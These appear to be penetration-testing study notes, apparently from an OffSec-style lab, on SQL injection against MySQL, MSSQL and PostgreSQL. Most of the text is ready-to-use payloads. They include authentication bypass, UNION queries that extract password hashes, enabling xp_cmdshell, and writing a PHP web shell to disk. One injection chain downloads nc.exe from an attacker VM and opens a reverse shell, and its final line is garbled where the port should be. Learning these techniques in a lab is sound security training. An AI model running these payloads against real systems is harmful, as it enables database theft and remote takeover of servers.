# SQL

## MySQL

{% code title="Connecting to the remote MySQL instance" overflow="wrap" lineNumbers="true" %}
```
mysql -u root -p'root' -h 192.168.50.16 -P 3306
select version();
select system_user();
show databases;
```
{% endcode %}

{% code title="Inspecting user's encrypted password" overflow="wrap" lineNumbers="true" %}
```
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
```
{% endcode %}

### SQLi

```
' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

{% code title="using CAST" overflow="wrap" lineNumbers="true" %}
```
weight=12&height=12'UNION+SELECT+null,CAST(passwd+AS+int),null,null,null,null+from+pg_shadow--&age=12&gender=Male&email=test%40t.com
```
{% endcode %}

## MSSQL

{% code title="Connecting to the Remote MSSQL instance via Impacket" overflow="wrap" lineNumbers="true" %}
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```
{% endcode %}

UNION-based payloads

{% code title="Verifying the exact number of columns" overflow="wrap" lineNumbers="true" %}
```
' ORDER BY 1-- //
```
{% endcode %}

{% code title="Enumerating the Database via SQL UNION Injection and fixing the injection" overflow="wrap" lineNumbers="true" %}
```
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
```
{% endcode %}

{% code title="Retrieving Current Database Tables and Columns" overflow="wrap" lineNumbers="true" %}
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
```
{% endcode %}

### _xp\_cmdshell_

{% code title="Enabling xp_cmdshell feature" overflow="wrap" lineNumbers="true" %}
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
{% endcode %}

{% code title="Executing Commands via xp_cmdshell" overflow="wrap" lineNumbers="true" %}
```
SQL> EXECUTE xp_cmdshell 'whoami';
output

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```
{% endcode %}

{% code title="Write a WebShell To Disk via INTO OUTFILE directive" overflow="wrap" lineNumbers="true" %}
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
{% endcode %}

{% code title="Accessing the webshell" overflow="wrap" lineNumbers="true" %}
```
curl http://192.168.42.12/tmp/webshell.php?cmd=id
```
{% endcode %}

### xp\_cmdshell 10.3.22 Q7 lab

{% hint style="info" %}
[https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp\_cmdshell/](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp\_cmdshell/)
{% endhint %}

{% code title="Payload to test for time based vulnerability" overflow="wrap" lineNumbers="true" %}
```
'WAITFOR+DELAY+'0:0:5'--
```
{% endcode %}

{% code title="Test if time based vulnerability is working; checked multiple times until identified the correct number of columns" overflow="wrap" lineNumbers="true" %}
```
'UNION+SELECT+1,2,3,4,5;WAITFOR+DELAY+'0:0:5'--
'UNION+SELECT+1,2,3,4;WAITFOR+DELAY+'0:0:5'--
'UNION+SELECT+1,2,3;WAITFOR+DELAY+'0:0:5'--
'UNION+SELECT+1,2;WAITFOR+DELAY+'0:0:5'--
```
{% endcode %}

<pre data-title="Sequential payloads to enable xp_cmdshell" data-overflow="wrap" data-line-numbers><code><strong>'UNION+SELECT+1,2;EXEC+sp_configure+'show+advanced+options',+1--
</strong>'UNION+SELECT+1,2;RECONFIGURE--
<strong>'UNION+SELECT+1,2;EXEC+sp_configure+'xp_cmdshell',+1--
</strong><strong>'UNION+SELECT+1,2;RECONFIGURE--
</strong></code></pre>

{% code title="Payload to test xp_cmdshell has been configured and is working; test with tcpdump on attacker VM" overflow="wrap" lineNumbers="true" %}
```
'UNION+SELECT+1,2;EXEC+xp_cmdshell+'ping+192.168.45.194'--
```
{% endcode %}

{% code title="Payload to download nc.exe from attack VM" overflow="wrap" lineNumbers="true" %}
```
'UNION+SELECT+1,2;EXEC+xp_cmdshell+'powershell.exe+wget+http://192.168.45.194/nc.exe+-OutFile+c:\\Users\Public\\nc.exe'--
```
{% endcode %}

{% code title="Final payload to get reverse shell" overflow="wrap" lineNumbers="true" %}
```
'UNION+SELECT+1,2;EXEC+xp_cmdshell+'c:\\Users\Public\\nc.exe+-e+cmd.exe+192.168.45.194+type gl4444'--
```
{% endcode %}

## Blind SQL injections

{% code title="Testing for time-based SQLi" overflow="wrap" lineNumbers="true" %}
```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```
{% endcode %}
